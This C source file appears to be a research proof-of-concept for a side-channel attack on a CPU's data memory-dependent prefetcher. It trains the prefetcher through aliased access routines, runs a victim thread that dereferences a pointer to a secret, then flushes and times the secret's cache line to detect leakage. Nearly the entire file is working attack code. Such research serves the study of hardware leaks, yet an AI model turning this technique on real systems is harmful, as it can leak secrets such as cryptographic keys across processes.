#include "../util/util.h"

#include "../bunnyhop/bunnyhop.h"
#include <sys/mman.h>
#include <pthread.h> 

uint64_t core_id;
uint64_t repititions; 
uint64_t training_size; 
uint64_t sort_output;

volatile uint64_t shared_variable; 
pthread_mutex_t lock =  PTHREAD_MUTEX_INITIALIZER; 
pthread_cond_t victim_go = PTHREAD_COND_INITIALIZER;

#define ATTACKER_TURN 1
#define VICTIM_TURN 0 

uint64_t (* access_aop)(uint64_t*, uint64_t, uint64_t, uint64_t);

// thread 
void *thread_work(void *arg) {
    (void) arg; 

    // pin 
    pin_cpu(core_id);

    while(1) {
        pthread_mutex_lock(&lock); 
        asm("mov (%0), %%rax\n"
            "mfence\n"
            : 
            : "r" (shared_variable)
            : "cc", "rax"); 

        pthread_cond_signal(&victim_go);
        pthread_mutex_unlock(&lock);
    }

    return NULL;
}

int main(int argc, char **argv) {

    // arg parse
    if(argc != 5) {
        printf("Usage: ./poc.out <core id> <repititions> <training size> <sort output?>\n");
        exit(1);
    }
    core_id = atoi(argv[1]);
    repititions = atoi(argv[2]);
    training_size = atoi(argv[3]);
    sort_output = atoi(argv[4]);
    pthread_mutex_lock(&lock); // grab lock 
    shared_variable = NULL; 

    printf("Experiment Setup:\n");
    printf("Core id: \t\t\t\t%lu\n", core_id);
    printf("repititions: \t\t\t\t%lu\n", repititions);
    printf("Training Size: \t\t\t\t%lu\n", training_size);
    printf("sort output: \t\t\t\t%lu\n", sort_output);

    // pin to pcore 
    pin_cpu(core_id); 

    // set up seed
    uint64_t thrash_seed = 12, target_seed = 10; uint64_t test_ptr_after = 0; // legacy code suppport

    // setup aop buffer streams 
    SETUP_AOP(training_aop);
    SETUP_DATA_BUFFER(training_data_buffer);

    // set up target buffers 
    srand(target_seed);
    if(training_size > 0) {
        for(int i = 0; i < training_size; i++) 
            training_aop[i] = (uint64_t)&training_data_buffer[(rand() & (DATA_BUFFER_MASK - 1)) * U64S_PER_CACHE_LINE];
    } else {
        printf("Error, 0 training pointers makes no sense ...\n");
        return -1; 
    }

    // collect all pointers / duplicate pointer check
    // srand(target_seed);
    // uint64_t indexes[training_size];
    // for(int i = 0; i < training_size; i++) {
    //    indexes[i] = (rand() & (DATA_BUFFER_MASK - 1)) * U64S_PER_CACHE_LINE; 
    //    assert(indexes[i] < training_data_buffer_size);
    // }
    // qsort( indexes, training_aop_size, sizeof(uint64_t), compare );  
    // for(int i = 1; i < training_aop_size; i++) {
    //     if(indexes[i-1] == indexes[i]) {
    //         printf("Duplicate pointers\n");
    //         exit(1);
    //     }
    // }

    // secrets what we want to leak 
    uint64_t *address_to_leak = malloc(30 * sizeof(uint64_t)); 
    uint64_t *secret = malloc(sizeof(uint64_t)); 
    *secret = (rand() & (MSB_MASK - 1)) ; 
    for(int i = 0; i < 30; i++) address_to_leak[i] = secret; 
    shared_variable = address_to_leak; 

    // trash
    uint64_t __trash = 0; 

    // thrash ddp state 
    sleep(0); 

    // start da thread which trains the DMP confidence entry 
    pthread_t tid;
    int status = pthread_create(&tid, NULL, thread_work, NULL);
    if(status != 0) {
        printf("thread start failure!\n");
        exit(1);
    }

    // generate training function with PC alias 
    access_aop = gen_access_aop(COLLISION_FUNC_START(DEFAULT_BASE, 0x22cf), 300);
    _mm_mfence();

    // train 
    uint64_t atk[repititions];
    uint64_t base[repititions];
    int mode = 0;
    int base_mode = 0; 
    for(int k = 0; k < repititions * 2; k++) {
        if(k%100 == 0) printf("Status %d\n", k);

        _mm_mfence(); 
        _mm_lfence();

        // thrash some table 
        sleep(0);

        // training 
        if(mode != base_mode) {
            _mm_mfence();
            __trash = access_aop(training_aop, training_size, __trash, 1);
        }
        __trash = clflush(secret, __trash);

        _mm_mfence(); 
        _mm_lfence();

        // switch to victim  
        pthread_cond_wait(&victim_go, &lock); 

        _mm_mfence(); 
        _mm_lfence();

        // sleep 
        __trash = c_sleep(1500, __trash);

        // measure 
        uint64_t test_time = time_access(secret, __trash);
        __trash = (__trash | test_time) & MSB_MASK;

        // save
        if(mode == base_mode)
            base[k/2] = test_time; 
        else 
            atk[k/2] = test_time;
        mode = ~mode; 
    }

    // output 
    if(sort_output)
        qsort( atk, repititions, sizeof(uint64_t), compare );  
    // qsort( base, repititions, sizeof(uint64_t), compare );  
    printf("Base: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", base[i]);
    printf("\n");
    printf("Atck: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", atk[i]);
    printf("\n");
}
